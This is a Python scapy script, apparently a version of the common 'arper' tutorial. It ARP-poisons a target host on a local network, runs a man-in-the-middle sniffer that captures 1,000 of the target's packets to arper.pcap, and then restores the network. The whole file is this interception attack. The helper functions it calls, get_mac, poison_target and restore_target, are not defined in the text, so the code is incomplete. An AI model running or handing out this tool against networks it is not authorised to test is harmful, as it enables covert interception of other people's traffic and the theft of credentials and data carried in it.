from scapy.all import *
import os
import sys
import threading
import signal

interface       = "en1"
target_ip       = "172.16.1.71"
gateway_ip      = "172.16.1.254"
packet_count    = 1000

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print("[*] Setting up", interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC; Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC; Exiting.")
    sys.exit(0)
else:
    print("[*] Target {} is at {}".format(target_ip, target_mac))

# Start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for {} packets".format(packet_count))

    bpf_filter = "ip host " + target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    # Write out the captured packets
    wrpcap("arper.pcap", packets)

    # Restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # Restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
